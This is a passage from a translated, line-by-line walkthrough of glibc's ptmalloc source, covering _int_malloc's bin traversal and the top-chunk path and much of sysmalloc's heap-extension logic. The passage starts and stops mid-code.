scan of the chunk in the corresponding bin. Instead, the malloc_consolidate(see malloc_state related function) function is used to process the chunk in the fast bin, and the chunks that may be merged are merged and then placed. In the unsorted bin, if you can't merge, put it directly into the unsorted bin, and then process it in the big loop below. Why not just take the large chunk directly from the corresponding bin? This is the mechanism of ptmalloc, which merges fragment chunks in the heap before allocating large chunks to reduce fragmentation in the heap. /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in otherwise tend to fragment. */ else { // Get the subscript of the large bin. idx = largebin_index ( nb ); // If there is fastbin, it will handle fastbin if ( have_fastchunks ( av )) malloc_consolidate ( av ); } Big loop - traversing unsorted bin \u00b6 **If the program is executed here, it means that there is no chunk in the bin (fast bin, small bin) that is exactly the same as the chunk size, which can directly satisfy the demand, but the large chunk is processed in this big loop. In the next cycle, the main operations are as follows Take the chunks in the unsorted bin one by one in the FIFO mode If it is a small request, consider whether it is just satisfied, if it is, return directly. If not, put it in the corresponding bin. Try to allocate the memory required by the user from the large bin This part is a big loop, this is to try to redistribute the small bin chunk, because we will first use the large bin, top chunk to try to satisfy the user's request, but if it is not satisfied, because we did not assign it successfully Small bin, we didn't merge the chunks in the fast bin, so we'll merge the fast bin chunks and use a big loop to try to allocate the small bin chunk again. /* Process recently freed or remaindered chunks, taking one only if it is exact fit, or, if this a small request, the chunk is remainder from the most recent non-exact fit. Place other traversed chunks in bins. Note that this step is the only place in any routine where chunks are placed in bins. The outer loop here is needed because we might not realize until near the end of malloc that we should have consolidated, so must do so and retry. This happens at most once, and only when we would otherwise need to expand memory to service a \"small\" request. */ for (;;) { int iters = 0 ; unsorted bin Traversing \u00b6 Consider the unsorted bin first, then consider the last remainder, but there are exceptions to the request for the small bin chunk. Note that the traversal order of unsorted bin is bk. // If the unsorted bin is not empty // First In First Out while (( victim = unsorted_chunks ( av ) -> bk ) ! = unsorted_chunks ( av )) { // victim is the last chunk of unsorted bin // bck is the penultimate chunk of unsorted bin bck = victim -> bk ; // Determine whether the obtained chunk meets the requirements, can not be too small, can not be too large // The size of the general system_mem is 132K if ( __builtin_expect ( chunksize_nomask ( victim ) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( chunksize_nomask ( victim ) > av -> system_mem , 0 )) malloc_printerr ( check_action , \"malloc(): memory corruption\" , chunk2mem ( victim ), av ); // Get the chunk size corresponding to the victim. size = chunksize ( victim ); small request \u00b6 If the user's request is a small bin chunk, then we first consider the last remainder. If the last remainder is the only one in the unsorted bin, and the size of the last remainder is enough to be a chunk, why is there no equal sign**? /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ if ( in_smallbin_range ( nb ) && bck == unsorted_chunks ( av ) && victim == av -> last_remainder && ( unsigned long ) ( size ) > ( unsigned long ) ( nb + MINSIZE )) { /* split and reattach remainder */ // Get the size of the new retriever remainder_size = size - nb ; // Get the location of the new retriever remainder = chunk_at_offset ( victim , nb ); // update the unsorted bin unsorted_chunks ( av ) -> bk = unsorted_chunks ( av ) -> fd = remainder ; // update the last_remainder recorded in av av -> last_remainder = remainder ; // Update the pointer of the last remainder remainder -> bk = remainder -> fd = unsorted_chunks ( av ); if ( ! in_smallbin_range ( remainder_size )) { remainder -> fd_nextsize = NULL ; remainder -> bk_nextsize = NULL ; } // Set the victim's head, set_head ( victim , nb | PREV_INUSE | ( av ! = & main_arena ? NON_MAIN_ARENA : 0 )); // Set the head of the remainder set_head ( remainder , remainder_size | PREV_INUSE ); // Set the prev_size field of the record remainder size because the retriever is idle at this time. set_foot ( remainder , remainder_size ); // Detailed inspection, no effect in non-debug mode check_malloced_chunk ( av , victim , nb ); // Convert victim from chunk mode to mem mode void * p = chunk2mem ( victim ); // If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } Initial take out \u00b6 /* remove from unsorted list */ unsorted_chunks ( av ) -> bk = bck ; bck -> fd = unsorted_chunks ( av ); exact fit \u00b6 If the chunk size taken from the unsorted bin is just right, use it directly. Here we should have allocated the appropriate chunks after the merger. /* Take now instead of binning if exact fit */ if ( size == nb ) { set_inuse_bit_at_offset ( victim , size ); if ( av != & main_arena ) set_non_main_arena ( victim ); check_malloced_chunk ( av , victim , nb ); void * p = chunk2mem ( victim ); alloc_perturb ( p , bytes ); return p ; } place chunk in small bin \u00b6 Put the extracted chunk into the corresponding small bin. /* place chunk in bin */ if ( in_smallbin_range ( size )) { victim_index = smallbin_index ( size ); bck = bin_at ( av , victim_index ); fwd = bck -> fd ; place chunk in large bin \u00b6 Put the fetched chunks into the corresponding large bin. } else { // large bin range victim_index = largebin_index ( size ); bck = bin_at ( av , victim_index ); // the head of the current large bin fwd = bck -> fd ; /* maintain large bins in sorted order */ /* From here we can conclude that largebin is sorted in descending order by fd_nextsize. The same size chunk, later will only be inserted into the same size chunk before. It is easy to understand without modifying the same size fd/bk_nextsize. Can reduce overhead. In addition, the bin header does not participate in the nextsize link. */ // If the large bin list is not empty if ( fwd != bck ) { /* Or with inuse bit to speed comparisons */ // Accelerate comparisons, not only should this be considered, because the chunks in the list will set this bit. size |= PREV_INUSE ; /* if smaller than smallest, bypass loop below */ // bck->bk stores the smallest chunk in the corresponding large bin. // If the traversed chunk is smaller than the current minimum, then it only needs to be inserted at the end of the list. // Determine if bck->bk is in main arena. assert ( chunk_main_arena ( bck -> bk )); if (( unsigned long ) ( size ) < ( unsigned long ) chunksize_nomask ( bck -> bk )) { // Let fwd point to the big bin header fwd = bck ; // Let bck point to the largin bin tail chunk bck = bck -> bk ; // victim's fd_nextsize points to the first chunk of largin bin victim -> fd_nextsize = fwd -> fd ; // victim's bk_nextsize points to the bk_nextsize pointed to by the first chunk of the original list. victim -> bk_nextsize = fwd -> fd -> bk_nextsize ; // The bk_nextsize of the first chunk of the original list points to the victim // The original fd_nextsize pointing to the first chunk of the list points to victim fwd -> fd -> bk_nextsize = victim -> bk_nextsize -> fd_nextsize = victim ; } else { // The size of the victim currently being inserted is larger than the smallest chunk // Determine if fwd is in main arena assert ( chunk_main_arena ( fwd )); // Start from the head of the list to find a chunk that is no bigger than the victim. while (( unsigned long ) size < chunksize_nomask ( fwd )) { fwd = fwd -> fd_nextsize ; assert ( chunk_main_arena ( fwd )); } // If you find a chunk that is as big as the victim, // Then insert the chunk directly after the chunk and don't modify the nextsize pointer. if (( unsigned long ) size == ( unsigned long ) chunksize_nomask ( fwd )) /* Always insert in the second position. */ fwd = fwd -> fd ; else { // If the chunk found is not the same size as the current victim // Then you need to construct a nextsize doubly linked list. victim -> fd_nextsize = fwd ; victim -> bk_nextsize = fwd -> bk_nextsize ; fwd -> bk_nextsize = victim ; victim -> bk_nextsize -> fd_nextsize = victim ; } bck = fwd -> bk ; } } else // If it is empty, simply make fd_nextsize and bk_nextsize form a doubly linked list. victim -> fd_nextsize = victim -> bk_nextsize = victim ; } Final take out \u00b6 // Put it in the corresponding bin to form bck<-->victim<-->fwd. mark_bin ( av , victim_index ); victim -> bk = bck ; victim -> fd = fwd ; fwd -> bk = victim ; bck -> fd = victim ; while Iterations \u00b6 While exits up to 10,000 iterations and exits. // # define MAX_ITERS 10000 if ( ++ iters >= MAX_ITERS ) break ; } large chunk \u00b6 Note: It may be very strange, why not go to see if the small chunk meets the new requirements first? This is because the small bin has already been judged before the loop. If there is one, the chunk will appear after the merge. But outside the big loop, the large chunk simply finds its index, so it feels reasonable to judge directly here, and also to find larger chunks for the following. If the requested chunk is in the large chunk range, it is scanned from small to large in the corresponding bin to find the first one. /* If a large request, scan through the chunks of current bin in sorted order to find smallest that fits. Use the skip list for this. */ if ( ! in_smallbin_range ( nb )) { bin = bin_at ( av , idx ); /* skip scan if empty or largest chunk is too small */ // If the corresponding bin is empty or the chunks in it are the smallest, skip it // first(bin)=bin->fd means the largest chunk in the current list. if (( victim = first ( bin )) != bin && ( unsigned long ) chunksize_nomask ( victim ) >= ( unsigned long ) ( nb )) { // Reverse traversing the list until the first chunk is found that is not less than the desired chunk size victim = victim -> bk_nextsize ; while ((( unsigned long ) ( size = chunksize ( victim )) < ( unsigned long ) ( nb ))) victim = victim -> bk_nextsize ; /* Avoid removing the first entry for a size so that the skip list does not have to be rerouted. */ // If the final chunk is not the last chunk in the bin, and the chunk is in front of the chunk // The size is the same, then we take the chunk in front of it, so we can avoid adjusting bk_nextsize, fd_nextsize // linked list. Because only one chunk of the same size will be chained to the nextsize chain. if ( victim != last ( bin ) && chunksize_nomask ( victim ) == chunksize_nomask ( victim -> fd )) victim = victim -> fd ; // Calculate the remaining size after the allocation remainder_size = size - nb ; // unlink unlink ( av , victim , bck , fwd ); /* Exhaust */ // The remaining size is not enough to be a block // Very curious what will happen next? if ( remainder_size < MINSIZE ) { set_inuse_bit_at_offset ( victim , size ); if ( av != & main_arena ) set_non_main_arena ( victim ); } /* Split */ // The remaining size can also be split as a chunk. else { // Get the pointer to the remaining chunk, called the reducer remainder = chunk_at_offset ( victim , nb ); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ // Insert in unsorted bin bck = unsorted_chunks ( av ); fwd = bck -> fd ; // Determine if the unsorted bin is destroyed. if ( __glibc_unlikely ( fwd -> bk != bck )) { errstr = \"malloc(): corrupted unsorted chunks\" ; goto errout ; } remainder -> bk = bck ; remainder -> fd = fwd ; bck -> fd = remainder ; fwd -> bk = remainder ; // If it is not in the range of small bin, set the corresponding field if ( ! in_smallbin_range ( remainder_size )) { remainder -> fd_nextsize = NULL ; remainder -> bk_nextsize = NULL ; } // Set the flag of the assigned chunk set_head ( victim , nb | PREV_INUSE | ( av ! = & main_arena ? NON_MAIN_ARENA : 0 )); // Set the last chunk of the remainder, that is, the usage status of the allocated chunk // The rest of the rules are inherited directly from above. set_head ( remainder , remainder_size | PREV_INUSE ); // Set the size of the remainder set_foot ( remainder , remainder_size ); } // an examination check_malloced_chunk ( av , victim , nb ); // Convert to mem state void * p = chunk2mem ( victim ); // If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } } Looking for a larger chunk \u00b6 If you get here, it means that for the chunks that the user needs, you can't get the chunk directly from the corresponding bin, so we need to find the faster bin, small bin or large bin larger than the current bin. /* Search for a chunk by scanning bins, starting with next largest bin. This search is strictly by best-fit; i.e., the smallest (with ties going to approximately the least recently used) chunk that fits is selected. The bitmap avoids needing to check that most blocks are nonempty. The particular case of skipping all bins during warm-up phases when no chunks have been returned yet is faster than it might look. */ ++ idx ; // Get the corresponding bin bin = bin_at ( av , idx ); // Get the current index in the binmap block index // #define idx2block(i) ((i) >> BINMAPSHIFT) ,BINMAPSHIFT=5 // Binmap is managed by block. Each block is an int with a total of 32 bits. It can indicate whether there are free chunks in 32 bins. // So here is the right shift 5 block = idx2block ( idx ); // Get the mapping corresponding to the current block size, here you can know whether there is a free block in the corresponding bin map = av -> binmap [ block ]; // #define idx2bit(i) ((1U << ((i) & ((1U << BINMAPSHIFT) - 1)))) // Set the bit corresponding to idx to 1, and the other bits to 0. bit = idx2bit ( idx ); for (;;) { Find a suitable map \u00b6 /* Skip rest of block if there are no more set bits in this block. */ // If bit>map, it means that there is no free block in the map that is larger than the current required chunk. // If the bit is 0, then the parameter brought by idx2bit above is 0. if ( bit > map || bit == 0 ) { do { // Find the next block until its corresponding map is not 0. // If it doesn't exist, you can only use the top chunk. if ( ++ block >= BINMAPSIZE ) /* out of bins */ goto use_top ; } while (( map = av -> binmap [ block ]) == 0 ); // Get its corresponding bin, because the chunk size in the map is larger than the required chunk, and // map itself is not 0, so there must be a chunk that meets the requirements. bin = bin_at ( av , ( block << BINMAPSHIFT )); bit = 1 ; } Find the right bin \u00b6 /* Advance to bin with set bit. There must be one. */ // Find from the smallest bin of the current map until you find the appropriate bin. // This is definitely there. while (( bit & map ) == 0 ) { bin = next_bin ( bin ); bit <<= 1 ; assert ( bit != 0 ); } Simple check chunk \u00b6 /* Inspect the bin. It is likely to be non-empty */ // Get the corresponding bin victim = last ( bin ); /* If a false alarm(empty bin), clear the bit. */ // If victim=bin, then we clear the bit corresponding to the map to 0 and then get the next bin. // The probability of this happening should be small. if ( victim == bin ) { av -> binmap [ block ] = map &= ~ bit ; /* Write through */ bin = next_bin ( bin ); bit <<= 1 ; } Really take out chunk \u00b6 else { // Get the size of the corresponding victim size = chunksize ( victim ); /* We know the first chunk in this bin is big enough to use. */ assert (( unsigned long ) ( size ) >= ( unsigned long ) ( nb )); // Calculate the remaining size after splitting remainder_size = size - nb ; /* unlink */ unlink ( av , victim , bck , fwd ); /* Exhaust */ // What if there is not enough chunk after splitting? if ( remainder_size < MINSIZE ) { set_inuse_bit_at_offset ( victim , size ); if ( av != & main_arena ) set_non_main_arena ( victim ); } /* Split */ // If enough, despite the segmentation else { // Calculate the offset of the remaining chunk remainder = chunk_at_offset ( victim , nb ); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ // Insert the remaining chunks into the unsorted bin bck = unsorted_chunks ( av ); fwd = bck -> fd ; if ( __glibc_unlikely ( fwd -> bk != bck )) { errstr = \"malloc(): corrupted unsorted chunks 2\" ; goto errout ; } remainder -> bk = bck ; remainder -> fd = fwd ; bck -> fd = remainder ; fwd -> bk = remainder ; /* advertise as last remainder */ // If it is in the range of small bin, mark it as a remainder if ( in_smallbin_range ( nb )) av -> last_remainder = remainder ; if ( ! in_smallbin_range ( remainder_size )) { remainder -> fd_nextsize = NULL ; remainder -> bk_nextsize = NULL ; } // Set the use status of the victim set_head ( victim , nb | PREV_INUSE | ( av ! = & main_arena ? NON_MAIN_ARENA : 0 )); // Set the usage status of the remainder. Why is this? set_head ( remainder , remainder_size | PREV_INUSE ); // Set the size of the remainder set_foot ( remainder , remainder_size ); } // an examination check_malloced_chunk ( av , victim , nb ); // The chunk state is converted to the mem state. void * p = chunk2mem ( victim ); // If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } Using top chunk \u00b6 If all the chunks in the bin have no way to directly meet the requirements (that is, not merged), or there are no free chunks. Then we can only use the top chunk. use_top : /* If large enough, split off the chunk bordering the end of memory (held in av->top). Note that this is in accord with the best-fit search rule. In effect, av->top is treated as larger (and thus less well fitting) than any other available chunk since it can be extended to be as large as necessary (up to system limitations). We require that av->top always exists (i.e., has size >= MINSIZE) after initialization, so if it would otherwise be exhausted by current request, it is replenished. (The main reason for ensuring it exists is that we may need MINSIZE space to put in fenceposts in sysmalloc.) */ // Get the current top chunk and calculate its corresponding size victim = av -> top ; size = chunksize ( victim ); // If the top chunk size still satisfies the minimum size of chunk after splitting, then you can split directly. if (( unsigned long ) ( size ) >= ( unsigned long ) ( nb + MINSIZE )) { remainder_size = size - nb ; remainder = chunk_at_offset ( victim , nb ); av -> top = remainder ; // Here, set PREV_INUSE because if the previous chunk of the top chunk is bound to be fastbin, // The top chunk will merged, so PREV_INUSE is set here. set_head ( victim , nb | PREV_INUSE | ( av ! = & main_arena ? NON_MAIN_ARENA : 0 )); set_head ( remainder , remainder_size | PREV_INUSE ); check_malloced_chunk ( av , victim , nb ); void * p = chunk2mem ( victim ); alloc_perturb ( p , bytes ); return p ; } // Otherwise, determine if there is a fast chunk /* When we are using atomic ops to free fast chunks we can get here for all block sizes. */ else if ( have_fastchunks ( av )) { // Perform a fast bin merge first malloc_consolidate ( av ); /* restore original bin index */ // Determine whether the required chunk is in the range of small bin or large bin // and calculate the corresponding index // Wait for the next time to see if you can if ( in_smallbin_range ( nb )) idx = smallbin_index ( nb ); else idx = largebin_index ( nb ); } Heap memory is not enough \u00b6 If the heap memory is not enough, we need to use sysmalloc to apply for memory. /* Otherwise, relay to handle system-dependent cases */ // Otherwise, we can only apply for a bit of memory from the system again. else { void * p = sysmalloc ( nb , av ); if ( p != NULL ) alloc_perturb ( p , bytes ); return p ; } _libc_calloc \u00b6 Calloc is also a function in libc that requests memory blocks. The package in libc is _libc_calloc , which is described below. /* calloc(size_t n_elements, size_t element_size); Returns a pointer to n_elements * element_size bytes, with all locations set to zero. */ void * __libc_calloc ( size_t , size_t ); sysmalloc \u00b6 As the comment in the function header says, this function is used to request more memory from the system when the current heap is out of memory. /* sysmalloc handles malloc cases requiring more memory from the system. On entry, it is assumed that av->top does not have enough space to service request for nb bytes, thus requiring that av->top be extended or replaced. */ Basic definition \u00b6 static void * sysmalloc ( INTERNAL_SIZE_T nb , mstate av ) { mchunkptr old_top ; /* incoming value of av->top */ INTERNAL_SIZE_T old_size ; /* its size */ char * old_end ; /* its end address */ long size ; /* arg to first MORECORE or mmap call */ char * brk ; /* return value from MORECORE */ long correction ; /* arg to 2nd MORECORE call */ char * snd_brk ; /* 2nd return val */ INTERNAL_SIZE_T front_misalign ; /* unusable bytes at front of new space */ INTERNAL_SIZE_T end_misalign ; /* partial page left at end of new space */ char * aligned_brk ; /* aligned offset into brk */ mchunkptr p ; /* the allocated/returned chunk */ mchunkptr remainder ; /* remainder frOm allocation */ unsigned long remainder_size ; /* its size */ size_t pagesize = GLRO ( dl_pagesize ); bool tried_mmap = false ; We can mainly focus on pagesize , which #ifndef EXEC_PAGESIZE #define EXEC_PAGESIZE 4096 #endif # define GLRO(name) _##name size_t _dl_pagesize = EXEC_PAGESIZE ; So, pagesize=4096=0x1000 . Consider mmap \u00b6 As stated in the opening comment, if any of the following conditions are met There is no heap allocated. If the requested memory is larger than mp_.mmap_threshold and the number of mmap is less than the maximum value, you can try to use mmap. By default, the threshold is static struct malloc_par mp_ = { . top_pad = DEFAULT_TOP_PAD , . n_mmaps_max = DEFAULT_MMAP_MAX , . mmap_threshold = DEFAULT_MMAP_THRESHOLD , . trim_threshold = DEFAULT_TRIM_THRESHOLD , #define NARENAS_FROM_NCORES(n) ((n) * (sizeof(long) == 4 ? 2 : 8)) . arena_test = NARENAS_FROM_NCORES ( 1 ) #if USE_TCACHE , . tcache_count = TCACHE_FILL_COUNT , . tcache_bins = TCACHE_MAX_BINS , . tcache_max_bytes = tidx2usize ( TCACHE_MAX_BINS - 1 ), . tcache_unsorted_limit = 0 /* No limit. */ #endif }; DEFAULT_MMAP_THRESHOLD is 128*1024 bytes, or 128 K. #ifndef DEFAULT_MMAP_THRESHOLD #define DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN #endif /* MMAP_THRESHOLD_MAX and _MIN are the bounds on the dynamically adjusted MMAP_THRESHOLD. */ #ifndef DEFAULT_MMAP_THRESHOLD_MIN #define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024) #endif #ifndef DEFAULT_MMAP_THRESHOLD_MAX /* For 32-bit platforms we cannot increase the maximum mmap threshold much because it is also the minimum value for the maximum heap size and its alignment. Going above 512k (i.e., 1M for new heaps) wastes too much address space. */ #if __WORDSIZE == 32 #define DEFAULT_MMAP_THRESHOLD_MAX (512 * 1024) #else #define DEFAULT_MMAP_THRESHOLD_MAX (4 * 1024 * 1024 * sizeof(long)) #endif #endif The following is part of the code, which is not the focus of our concern at present, and can be skipped temporarily. /* If have mmap, and the request size meets the mmap threshold, and the system supports mmap, and there are few enough currently allocated mmapped regions, try to directly map this request rather than expanding top. */ if ( av == NULL || (( unsigned long )( nb ) >= ( unsigned long )( mp_ . mmap_threshold ) && ( mp_ . n_mmaps < mp_ . n_mmaps_max )) { char * mm ; /* return value from mmap call*/ try_mmap : /* Round up size to nearest page. For mmapped chunks, the overhead is one SIZE_SZ unit larger than for normal chunks, because there is no following chunk whose prev_size field could be used. See the front_misalign handling below, for glibc there is no need for further alignments unless we have have high alignment. */ if ( MALLOC_ALIGNMENT == 2 * SIZE_SZ ) size = ALIGN_UP ( nb + SIZE_SZ , pagesize ); else size = ALIGN_UP ( nb + SIZE_SZ + MALLOC_ALIGN_MASK , pagesize ); tried_mmap = true ; /* Don't try if size wraps around 0 */ if (( unsigned long )( size ) > ( unsigned long )( nb )) { mm = ( char * )( MMAP ( 0 , size , PROT_READ | PROT_WRITE , 0 )); if ( mm != MAP_FAILED ) { /* The offset to the start of the mmapped region is stored in the prev_size field of the chunk. This allows us to adjust returned start address to meet alignment requirements here and in memalign(), and still be able to compute proper address argument for later munmap in free() and realloc(). */ if ( MALLOC_ALIGNMENT == 2 * SIZE_SZ ) { /* For glibc, chunk2mem increases the address by 2*SIZE_SZ and MALLOC_ALIGN_MASK is 2*SIZE_SZ-1. Each mmap'ed area is page aligned and therefore definitely MALLOC_ALIGN_MASK-aligned. */ assert ((( INTERNAL_SIZE_T ) chunk2mem ( mm ) & MALLOC_ALIGN_MASK ) == 0 ); front_misalign = 0 ; } else front_misalign = ( INTERNAL_SIZE_T ) chunk2mem ( mm ) & MALLOC_ALIGN_MASK ; if ( front_misalign > 0 ) { correction = MALLOC_ALIGNMENT - front_misalign ; p = ( mchunkptr )( mm + correction ); set_prev_size ( p , correction ); set_head ( p , ( size - correction ) | IS_MMAPPED ); } else { p = ( mchunkptr ) mm ; set_prev_size ( p , 0 ); set_head ( p , size | IS_MMAPPED ); } /* update statistics */ int new = atomic_exchange_and_add ( & mp_ . n_mmaps , 1 ) + 1 ; atomic_max ( & mp_ . max_n_mmaps , new ); unsigned long sum ; sum = atomic_exchange_and_add ( & mp_ . mmapped_mem , size ) + size ; atomic_max ( & mp_ . max_mmapped_mem , sum ); check_chunk ( av , p ); return chunk2mem ( p ); } } } mmap failed or unallocated heap \u00b6 /* There are no usable arenas and mmap also failed. */ if ( av == NULL ) return 0 ; If it is any of these two situations, you can actually quit. . Recording old heap information \u00b6 /* Record incoming configuration of top */ old_top = av -> top ; old_size = chunksize ( old_top ); old_end = ( char * )( chunk_at_offset ( old_top , old_size )); brk = snd_brk = ( char * )( MORECORE_FAILURE ); Check old heap information 1 \u00b6 /* If not the first time through, we require old_size to be at least MINSIZE and to have prev_inuse set. */ assert (( old_top == initial_top ( av ) && old_size == 0 ) || (( unsigned long )( old_size ) >= MINSIZE && prev_inuse ( old_top ) && (( unsigned long ) old_end & ( pagesize - 1 )) == 0 )); This check requires that any one of the conditions be met old_top == initial_top(av) && old_size == 0 , ie if it is the first time, the heap size needs to be 0. The new heap, then (unsigned long)(old_size) >= MINSIZE && prev_inuse(old_top) , the heap size should be no smaller than MINSIZE , and the previous heap block should be in use. ((unsigned long)old_end &(pagesize - 1)) == 0) , the end address of the heap should be page-aligned. Since the page alignment size defaults to 0x1000, the lower 12 bits need to be 0. Check old heap information 2 \u00b6 /* Precondition: not enough current space to satisfy nb request */ assert (( unsigned long )( old_size ) < ( unsigned long )( nb + MINSIZE )); According to the definition in malloc static void * _int_malloc ( mstate av , size_t bytes ) { INTERNAL_SIZE_T nb ; /* normalized request size */ nb should be the byte that has been added to the chunk header. Why add MINSIZE ? This is because the size of the top chunk should at least reserve the MINSIZE space for easy merging. Non main_arena \u00b6 This is not the focus of care for the time being, and it will not be analyzed for the time being. if ( av ! = & main_arena ) { heap_info * old_heap , * heap ; size_t old_heap_size ; /* First try to extend the current heap. */ old_heap = heap_for_ptr ( old_top ); old_heap_size = old_heap -> size ; if (( long )( MINSIZE + nb - old_size ) > 0 && grow_heap ( old_heap , MINSIZE + nb - old_size ) == 0 ) { av -> system_mem += old_heap -> size - old_heap_size ; set_head ( old_top , ((( char * ) old_heap + old_heap -> size ) - ( char * ) old_top ) | PREV_INUSE ); } else if (( heap = new_heap ( nb + ( MINSIZE + sizeof ( * heap )), mp_ . top_pad ))) { /* Use a newly allocated heap. */ heap -> ar_ptr = av ; heap -> prev = old_heap ; av -> system_mem + = heap -> size ; /* Set up the new top. */ top ( av ) = chunk_at_offset ( heap , sizeof ( * heap )); set_head ( top ( av ), ( heap -> size - sizeof ( * heap )) | PREV_INUSE ); /* Setup fencepost and free the old top chunk with a multiple of MALLOC_ALIGNMENT in size. */ /* The fencepost takes at least MINSIZE bytes, because it might become the top chunk again later. Note that a footer is set up, too, although the chunk is marked in use. */ old_size = ( old_size - MINSIZE ) & ~ MALLOC_ALIGN_MASK ; set_head ( chunk_at_offset ( old_top , old_size + 2 * SIZE_SZ ), 0 | PREV_INUSE ); if ( old_size >= MINSIZE ) { set_head ( chunk_at_offset ( old_top , old_size ), ( 2 * SIZE_SZ ) | PREV_INUSE ); set_foot ( chunk_at_offset ( old_top , old_size ), ( 2 * SIZE_SZ )); set_head ( old_top , old_size | PREV_INUSE | NON_MAIN_ARENA ); _int_free ( av , old_top , 1 ); } else { set_head ( old_top , ( old_size + 2 * SIZE_SZ ) | PREV_INUSE ); set_foot ( old_top , ( old_size + 2 * SIZE_SZ )); } } else if ( ! tried_mmap ) /* We can at least try to use to mmap memory. */ goto try_mmap ; } Main_arena Processing \u00b6 Calculating memory \u00b6 The calculation can satisfy the requested memory size. else { / * by == main_arena * / /* Request enough space for nb + pad + overhead */ size = nb + mp_ . top_pad + MINSIZE ; By default top_pad is defined as #ifndef DEFAULT_TOP_PAD # define DEFAULT_TOP_PAD 131072 #endif That is, 131072 bytes, 0x20000 bytes. Whether it is continuous \u00b6 If we want the heap space to be continuous, then we can actually reuse the previous memory. /* If contiguous, we can subtract out existing space that we hope to combine with new space. We add it back later only if we don't actually get contiguous space. */ if ( contiguous ( av )) size -= old_size ; Align page size \u00b6 /* Round to a multiple of page size. If MORECORE is not contiguous, this ensures that we only call it with whole-page arguments. And if MORECORE is contiguous and this is not first time through, this preserves page-alignment of previous calls. Otherwise, we correct to page-align below. */ size = ALIGN_UP ( size , pagesize ); Applying for memory \u00b6 /* Don't try to call MORECORE if argument is so big as to appear negative. Note that since mmap takes size_t arg, it may succeed below even if we cannot call MORECORE. */ if ( size > 0 ) { brk = ( char * )( MORECORE ( size )); LIBC_PROBE ( memory_sbrk_more , 2 , brk , size ); } May succeed \u00b6 if ( brk != ( char * )( MORECORE_FAILURE )) { /* Call the `morecore' hook if necessary. */ void ( * hook )( void ) = atomic_forced_read ( __after_morecore_hook ); if ( __builtin_expect ( hook != NULL , 0 )) ( * hook )(); } It is a bit of a meaning to call a hook here. Failed \u00b6 Failure, consider mmap. else { /* If have mmap, try using it as a backup when MORECORE fails or cannot be used. This is worth doing on systems that have \"holes\" in address space, so sbrk cannot extend to give contiguous space, but space is available elsewhere. Note that we ignore mmap max count and threshold limits, since the space will not be used as a segregated mmap region. */ /* Cannot merge with old top, so add its size back in */ if ( contiguous ( av )) size = ALIGN_UP ( size + old_size , pagesize ); /* If we are relying on mmap as backup, then use larger units */ if (( unsigned long )( size ) < ( unsigned long )( MMAP_AS_MORECORE_SIZE )) size = MMAP_AS_MORECORE_SIZE ; /* Don't try if size wraps around 0 */ if (( unsigned long )( size ) > ( unsigned long )( nb )) { char * mbrk = ( char * )( MMAP ( 0 , size , PROT_READ | PROT_WRITE , 0 )); if ( mbrk != MAP_FAILED ) { /* We do not need, and cannot use, another sbrk call to find end */ brk = mbrk ; snd_brk = brk + size ; /* Record that we no longer have a contiguous sbrk region. After the first time mmap is used as backup, we do not ever rely on contiguous space since this could incorrectly bridge regions. */ set_noncontiguous ( av ); } } } Memory may be applied successfully \u00b6 if ( brk != ( char * )( MORECORE_FAILURE )) { if ( mp_ . sbrk_base == 0 ) mp_srk_base = brk ; av -> system_mem + = size ; Situation 1 \u00b6 /* If MORECORE extends previous space, we can likewise extend top size. */ if ( brk == old_end && snd_brk == ( char * )( MORECORE_FAILURE )) set_head ( old_top , ( size + old_size ) | PREV_INUSE ); Case 2 - Unexpected memory exhaustion \u00b6 else if ( contiguous ( av ) && old_size && brk < old_end ) /* Oops! Someone else killed our space.. Can't touch anything. */ malloc_printerr ( \"break adjusted to free malloc space\" ); Handling other unexpected situations \u00b6 /* Otherwise, make adjustments: * If the first time through or noncontiguous, we need to call sbrk just to find out where the end of memory lies. * We need to ensure that all returned chunks from malloc will meet MALLOC_ALIGNMENT * If there was an intervening foreign sbrk, we need to adjust sbrk request size to account for fact that we will not be able to combine new space with existing space in old_top. * Almost all systems internally allocate whole pages at a time, in which case we might as well use the whole last page of request. So we allocate enough more memory to hit a page boundary now, which in turn causes future contiguous calls to page-align. */ else { front_misalign = 0 ; end_misalign = 0 ; correction = 0 ; aligned_brk = brk ; Processing contiguous memory \u00b6 /* handle contiguous cases */ if ( contiguous ( av )) { /* Count foreign sbrk as system_mem. */ if ( old_size ) av -> system_mem + = brk - old_end ; /* Guarantee alignment of first new chunk made from this space */ front_misalign = ( INTERNAL_SIZE_T ) chunk2mem ( brk ) & MALLOC_ALIGN_MASK ; if ( front_misalign > 0 ) { /* Skip over some bytes to arrive at an aligned position. We don't need to specially mark these wasted front bytes. They will never be accessed anyway because prev_inuse of av->top (and any chunk created from its start) is always true after initialization. */ correction = MALLOC_ALIGNMENT - front_misalign ; aligned_brk += correction ; } /* If this isn't adjacent to existing space, then we will not be able to merge with old_top space, so must add to 2nd request. */ correction += old_size ; /* Extend the end address to hit a page boundary */ end_misalign = ( INTERNAL_SIZE_T )( brk + size + correction ); correction += ( ALIGN_UP ( end_misalign , pagesize )) - end_misalign ; assert ( correction >= 0 ); snd_brk = ( char * )( MORECORE ( correction )); /* If can't allocate correction, try to at least find out current brk. It might be enough to proceed without failing. Note that if second sbrk did NOT fail, we assume that space is contiguous with first sbrk. This is a safe assumption unless program is multithreaded but doesn't use locks and a foreign sbrk occurred between our first and second calls. */ if ( snd_brk == ( char * )( MORECORE_FAILURE )) { correction = 0 ; snd_brk = ( char * ) ( MORECORE ( 0 )); } else { /* Call the `morecore' hook if necessary. */ void ( * hook )( void ) = atomic_forced_read ( __after_morecore_hook ); if ( __builtin_expect ( hook != NULL , 0 )) ( * hook 